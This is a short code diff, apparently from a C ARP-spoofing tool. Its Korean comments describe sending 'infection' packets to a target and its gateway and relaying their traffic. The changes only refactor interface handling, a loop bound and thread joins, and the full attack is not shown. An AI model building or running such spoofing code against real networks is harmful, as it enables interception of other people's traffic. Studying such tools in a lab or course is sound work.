@@ -4,7 +4,7 @@
 void *thread_infect(void *arg) //감염패킷
 {
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *pcap_handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
+    pcap_t *pcap_handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 
     u_char pkt[PACKETSIZE];
     // 공격 대상과 Gateway에게 번갈아가며 감염 패킷 전송
@@ -25,7 +25,7 @@ void *thread_relay(void *arg)
 {
     struct infect_addr_save *add_save = (struct infect_addr_save *)arg;
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *pcap_handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
+    pcap_t *pcap_handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     struct pcap_pkthdr *header;
     const u_char *packet;
 
@@ -74,7 +74,7 @@ int main(int argc, char *argv[])
         return -1;
     }
 
-    char *dev = argv[1];
+    dev = argv[1];
     getMyMacIp(dev);
 
     for (int i = 0; i < 6; ++i)
@@ -92,7 +92,7 @@ int main(int argc, char *argv[])
         return -1;
     }
 
-    for (int i = 1; i <= argc / 2 - 1; i++)
+    for (int i = 1; i < argc / 2; i++)
         sendBroadcast(argv, pcap_handle, TARGET); //최초 감염 시작. for문 다 돌기전에 reply 패킷 오는지 확인 해야함.
 
     struct infect_addr_save *infect_addr_save;
@@ -132,6 +132,8 @@ int main(int argc, char *argv[])
 
     pthread_create(&thread[1], NULL, thread_relay, (void *)infect_addr_save);
 
+    pthread_join(thread[0], NULL);
+    pthread_join(thread[1], NULL);
     while (1)
     {
         sleep(1);
